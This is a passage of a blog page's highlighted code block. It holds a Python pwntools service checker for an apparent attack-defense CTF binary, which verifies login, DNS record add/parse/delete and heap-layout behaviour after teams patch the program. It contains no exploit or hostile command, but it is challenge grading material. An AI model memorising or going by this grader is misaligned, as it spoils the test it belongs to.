class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> thread</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> termcolor <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">coding_check_level = <span class="number">1</span></span><br><span class="line">fmt_check_level = <span class="number">0</span></span><br><span class="line">log_file = <span class="string">'note_check'</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">check = <span class="keyword">False</span></span><br><span class="line">file_path = <span class="string">'/home/tsctf/binary/pwn'</span><span class="comment">#/Desktop/DNS_Server'</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    round_time = <span class="number">300</span></span><br><span class="line">    slog = <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    round_time = <span class="number">300</span></span><br><span class="line">    slog = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TimeoutError</span><span class="params">(Exception)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, err=<span class="string">'timeout'</span>)</span>:</span></span><br><span class="line">        Exception.__init__(self, err)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ResponseError</span><span class="params">(Exception)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, err=<span class="string">'ErrResponse'</span>)</span>:</span></span><br><span class="line">        Exception.__init__(self, err)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Checker</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    function checker for Question Note</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, _rhost, _port, _timeout)</span>:</span></span><br><span class="line">        <span class="comment"># pwntools init</span></span><br><span class="line">        <span class="keyword">global</span> context</span><br><span class="line">        <span class="keyword">global</span> slog</span><br><span class="line">        context.log_level = <span class="string">'ERROR'</span></span><br><span class="line">        <span class="keyword">if</span> slog:</span><br><span class="line">            context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line">        <span class="keyword">if</span> _timeout:</span><br><span class="line">            context.timeout = _timeout</span><br><span class="line"></span><br><span class="line">        <span class="comment"># check result init</span></span><br><span class="line">        self.state = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># local variables init</span></span><br><span class="line">        self.rhost = remote(_rhost, _port)</span><br><span class="line">        self.name = <span class="string">''</span></span><br><span class="line">        self.oip = _rhost</span><br><span class="line">        self.oport = _port</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">randstr</span><span class="params">(self, length=<span class="number">10</span>)</span>:</span>  <span class="comment"># generate random string with lowercase</span></span><br><span class="line">        result = <span class="string">''</span></span><br><span class="line">        space = string.lowercase</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(length):</span><br><span class="line">            index = random.randint(<span class="number">0</span>, len(space) - <span class="number">1</span>)</span><br><span class="line">            result += space[index]</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(self, inputstr)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> hashlib.md5(inputstr).hexdigest()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_login</span><span class="params">(self)</span>:</span></span><br><span class="line">        data = self.rhost.recvuntil(<span class="string">'=====================\n&gt;'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            print_log(colored(<span class="string">'[Error] outoftime : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> TimeoutError</span><br><span class="line">        self.rhost.sendline(<span class="string">"1"</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"===============\n&gt;"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">"1"</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"name:"</span>)</span><br><span class="line">        name = self.randstr(<span class="number">7</span>)</span><br><span class="line">        self.rhost.sendline(name)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">'OK, I know your name :\n'</span>)</span><br><span class="line">        recv = self.rhost.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> recv:</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in login_set_name : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError</span><br><span class="line">        <span class="keyword">if</span> ((name+<span class="string">'\n'</span>) <span class="keyword">in</span> recv)&amp;(fmt_check_level!=<span class="number">0</span>):</span><br><span class="line">            print_log(colored(<span class="string">'[Error] bad patch format vul : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError            </span><br><span class="line">        self.rhost.sendline(<span class="string">'2'</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">'motto:'</span>)</span><br><span class="line">        motto = self.randstr(<span class="number">0x200</span>)</span><br><span class="line">        self.rhost.send(motto)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">'3'</span>)</span><br><span class="line">        <span class="keyword">if</span> motto <span class="keyword">not</span> <span class="keyword">in</span> self.rhost.recvuntil(<span class="string">"&gt;"</span>):</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in login_show_motto : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(self,domain,length,remark,ip)</span>:</span> </span><br><span class="line">        self.rhost.recvuntil(<span class="string">'&gt;'</span>)    </span><br><span class="line">        self.rhost.sendline(<span class="string">'2'</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"domain:"</span>)</span><br><span class="line">        <span class="comment">#domain_2 = self.randstr(0x30)</span></span><br><span class="line">        self.rhost.sendline(domain)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"length:"</span>)</span><br><span class="line">        self.rhost.sendline(str(length))</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"remark:"</span>)</span><br><span class="line">        <span class="comment">#remark_2 = self.randstr(0x90)</span></span><br><span class="line">        self.rhost.sendline(remark)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"input IP:"</span>)</span><br><span class="line">        self.rhost.sendline(ip)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(self,domain)</span>:</span></span><br><span class="line">        self.rhost.recvuntil(<span class="string">'&gt;'</span>)    </span><br><span class="line">        self.rhost.sendline(<span class="string">'4'</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">'domain:'</span>)</span><br><span class="line">        self.rhost.sendline(domain)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self,domain)</span>:</span></span><br><span class="line">        self.rhost.recvuntil(<span class="string">'&gt;'</span>)    </span><br><span class="line">        self.rhost.sendline(<span class="string">'3'</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">'domain:'</span>)</span><br><span class="line">        self.rhost.sendline(domain)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_DNS</span><span class="params">(self)</span>:</span></span><br><span class="line">        data = self.rhost.recvuntil(<span class="string">'=====================\n&gt;'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            print_log(colored(<span class="string">'[Error] outoftime : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> TimeoutError</span><br><span class="line">        self.rhost.sendline(<span class="string">"1"</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"===============\n&gt;"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">"1"</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"name:"</span>)</span><br><span class="line">        name = self.randstr(<span class="number">7</span>)</span><br><span class="line">        self.rhost.sendline(name)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">'OK, I know your name :\n'</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">'4'</span>)  </span><br><span class="line">        <span class="comment"># add    </span></span><br><span class="line"></span><br><span class="line">        domain_1 = self.randstr(<span class="number">0x30</span><span class="number">-1</span>)</span><br><span class="line">        domain_2 = self.randstr(<span class="number">0x30</span><span class="number">-1</span>)</span><br><span class="line">        remark_1 = self.randstr(<span class="number">0x50</span><span class="number">-1</span>)</span><br><span class="line">        remark_2 = self.randstr(<span class="number">0x90</span><span class="number">-1</span>)</span><br><span class="line">        remark_3 = self.randstr(<span class="number">0x110</span><span class="number">-1</span>)</span><br><span class="line">        self.add(domain_1,<span class="number">0x50</span>,remark_1,<span class="string">"127.0.0.1"</span>)</span><br><span class="line">        self.add(domain_1,<span class="number">0x90</span>,remark_2,<span class="string">"127.0.0.1"</span>)</span><br><span class="line">        self.add(domain_2,<span class="number">0x110</span>,remark_3,<span class="string">"0.0.0.0"</span>)</span><br><span class="line">        self.parse(domain_1)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"adder : "</span>)</span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> self.rhost.recvline():</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in parse : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError               </span><br><span class="line">        self.rhost.recvuntil(<span class="string">"IP    : "</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"127.0.0.1"</span> <span class="keyword">not</span> <span class="keyword">in</span> self.rhost.recvline():</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in parse : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError    </span><br><span class="line">        self.rhost.recvuntil(<span class="string">"remark: "</span>)</span><br><span class="line">        <span class="keyword">if</span> remark_1 <span class="keyword">not</span> <span class="keyword">in</span> self.rhost.recvline():</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in parse : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError    </span><br><span class="line">        self.rhost.recvuntil(<span class="string">"adder : "</span>)</span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> self.rhost.recvline():</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in parse : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError               </span><br><span class="line">        self.rhost.recvuntil(<span class="string">"IP    : "</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"127.0.0.1"</span> <span class="keyword">not</span> <span class="keyword">in</span> self.rhost.recvline():</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in parse : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError    </span><br><span class="line">        self.rhost.recvuntil(<span class="string">"remark: "</span>)</span><br><span class="line">        <span class="keyword">if</span> remark_2 <span class="keyword">not</span> <span class="keyword">in</span> self.rhost.recvline():</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in parse : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError </span><br><span class="line"></span><br><span class="line">        self.parse(domain_2)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"adder : "</span>)</span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> self.rhost.recvline():</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in parse : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError               </span><br><span class="line">        self.rhost.recvuntil(<span class="string">"IP    : "</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"0.0.0.0"</span> <span class="keyword">not</span> <span class="keyword">in</span> self.rhost.recvline():</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in parse : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError    </span><br><span class="line">        self.rhost.recvuntil(<span class="string">"remark: "</span>)</span><br><span class="line">        <span class="keyword">if</span> remark_3 <span class="keyword">not</span> <span class="keyword">in</span> self.rhost.recvline():</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in parse : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        self.delete(domain_2)</span><br><span class="line">        self.parse(domain_2)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"not find!!"</span> <span class="keyword">not</span> <span class="keyword">in</span> self.rhost.recvuntil(<span class="string">"==GOD"</span>):</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in parse : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_num</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.rhost.recvuntil(<span class="string">'Your Total is '</span>)</span><br><span class="line">        <span class="keyword">return</span> int(self.rhost.recvline()[:<span class="number">-1</span>])</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_money</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.rhost.recvuntil(<span class="string">"Cash: $"</span>)</span><br><span class="line">        <span class="keyword">return</span> int(self.rhost.recvline()[:<span class="number">-1</span>])</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">round</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.money = self.get_money()</span><br><span class="line">        <span class="keyword">if</span> (self.money!= self.pre_money):</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in game : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError                </span><br><span class="line">        self.rhost.recvuntil(<span class="string">"Bet: $"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">'1'</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">'Please Enter H to Hit or S to Stay.'</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">'H'</span>)</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">            num = self.get_num()</span><br><span class="line">            tmp = self.rhost.recv()</span><br><span class="line">            <span class="comment">#print '[+]',tmp,'[-]'</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'Would You Like to Hit or Stay?'</span> <span class="keyword">in</span> tmp:</span><br><span class="line">                self.rhost.sendline(<span class="string">"H"</span>)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">'Enter Y for Yes or N for No'</span> <span class="keyword">in</span> tmp:</span><br><span class="line">                win_num = int(tmp.split(<span class="string">' Wins and '</span>)[<span class="number">0</span>][<span class="number">-1</span>:])</span><br><span class="line">                loss_num = int(tmp.split(<span class="string">' Wins and '</span>)[<span class="number">1</span>][:<span class="number">1</span>])</span><br><span class="line">                <span class="keyword">if</span> self.win &lt; win_num:</span><br><span class="line">                    self.win = win_num</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> self.loss &lt; loss_num:</span><br><span class="line">                    self.loss = loss_num</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tmp = self.rhost.recv()</span><br><span class="line">                <span class="comment">#print '[+]',tmp,'[-]'</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">'Would You Like to Hit or Stay?'</span> <span class="keyword">in</span> tmp:</span><br><span class="line">                    self.rhost.sendline(<span class="string">"H"</span>)</span><br><span class="line">                <span class="keyword">elif</span> <span class="string">'Enter Y for Yes or N for No'</span> <span class="keyword">in</span> tmp:</span><br><span class="line">                    win_num = int(tmp.split(<span class="string">' Wins and '</span>)[<span class="number">0</span>][<span class="number">-1</span>:])</span><br><span class="line">                    loss_num = int(tmp.split(<span class="string">' Wins and '</span>)[<span class="number">1</span>][:<span class="number">1</span>])</span><br><span class="line">                    <span class="keyword">if</span> self.win &lt; win_num:</span><br><span class="line">                        self.win = win_num</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> self.loss &lt; loss_num:</span><br><span class="line">                        self.loss = loss_num</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">-1</span>                </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_game</span><span class="params">(self)</span>:</span></span><br><span class="line">        data = self.rhost.recvuntil(<span class="string">'=====================\n&gt;'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            print_log(colored(<span class="string">'[Error] outoftime : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> TimeoutError</span><br><span class="line">        self.win = <span class="number">0</span></span><br><span class="line">        self.loss = <span class="number">0</span></span><br><span class="line">        self.money = <span class="number">5</span></span><br><span class="line">        self.pre_money = <span class="number">5</span></span><br><span class="line">        self.rhost.sendline(str(<span class="number">0xbabe</span>))</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"(Y/N)"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">"y"</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"Choice:"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">"1"</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">            self.pre_money += self.round()</span><br><span class="line">            self.rhost.sendline(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_heap</span><span class="params">(self)</span>:</span></span><br><span class="line">        data = self.rhost.recvuntil(<span class="string">'=====================\n&gt;'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            print_log(colored(<span class="string">'[Error] outoftime : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> TimeoutError</span><br><span class="line">        self.rhost.sendline(<span class="string">'2'</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"["</span>)</span><br><span class="line">        addr_1 = int(self.rhost.recvuntil(<span class="string">']'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"domain:"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">"p4nda"</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"length:"</span>)</span><br><span class="line">        self.rhost.sendline(str(<span class="number">0x58</span>))</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"["</span>)</span><br><span class="line">        addr_2 = int(self.rhost.recvuntil(<span class="string">']'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)       </span><br><span class="line">        <span class="keyword">if</span> (addr_2-addr_1)!=<span class="number">0x50</span>:</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in heap : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError              </span><br><span class="line">        self.rhost.recvuntil(<span class="string">"remark:"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">"p4nda"</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"input IP:"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">"1.1.1.1"</span>)</span><br><span class="line">        <span class="comment">#test 1</span></span><br><span class="line">        self.rhost.recvuntil(<span class="string">"&gt;"</span>)        </span><br><span class="line">        self.rhost.sendline(<span class="string">'2'</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"["</span>)</span><br><span class="line">        addr_3 = int(self.rhost.recvuntil(<span class="string">']'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span>(addr_3-addr_2)!=<span class="number">0x80</span>:</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in heap : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError                     </span><br><span class="line">        self.rhost.recvuntil(<span class="string">"domain:"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">"dubhe"</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"length:"</span>)</span><br><span class="line">        self.rhost.sendline(str(<span class="number">0x110</span>))</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"["</span>)</span><br><span class="line">        addr_4 = int(self.rhost.recvuntil(<span class="string">']'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)       </span><br><span class="line">        <span class="keyword">if</span> (addr_4-addr_3)!=<span class="number">0x50</span>:</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in heap : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError              </span><br><span class="line">        self.rhost.recvuntil(<span class="string">"remark:"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">"p4nda"</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"input IP:"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">"1.1.1.1"</span>)     </span><br><span class="line">        <span class="comment">#test 2 </span></span><br><span class="line">        self.delete(<span class="string">"p4nda"</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">'2'</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"["</span>)</span><br><span class="line">        addr_3 = int(self.rhost.recvuntil(<span class="string">']'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span>(addr_3!=addr_1):</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in heap : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError           </span><br><span class="line">        self.rhost.recvuntil(<span class="string">"domain:"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">"p4nda"</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"length:"</span>)</span><br><span class="line">        self.rhost.sendline(str(<span class="number">0x58</span>))</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"["</span>)</span><br><span class="line">        addr_4 = int(self.rhost.recvuntil(<span class="string">']'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)       </span><br><span class="line">        <span class="keyword">if</span>(addr_2!=addr_4):</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in heap : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError               </span><br><span class="line">        self.rhost.recvuntil(<span class="string">"remark:"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">"p4nda"</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"input IP:"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">"1.1.1.1"</span>)        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">function_check</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.check_login()</span><br><span class="line">            self.rhost.close()</span><br><span class="line">            self.rhost = remote(self.oip, self.oport)</span><br><span class="line">            self.check_DNS()</span><br><span class="line">            <span class="comment">#self.rhost.close()</span></span><br><span class="line">            <span class="comment">#self.rhost = remote(self.oip, self.oport)</span></span><br><span class="line">            <span class="comment">#self.check_game()</span></span><br><span class="line">            self.rhost.close()</span><br><span class="line">            self.rhost = remote(self.oip, self.oport)   </span><br><span class="line">            self.check_heap()</span><br><span class="line">            self.rhost.close()          </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">print</span> e</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.rhost.close()</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            self.state = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getResult</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.state</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(ip, port)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    function: check workstate with single ip</span></span><br><span class="line"><span class="string">    :return: </span></span><br><span class="line"><span class="string">        check result</span></span><br><span class="line"><span class="string">        format &#123;'ip': 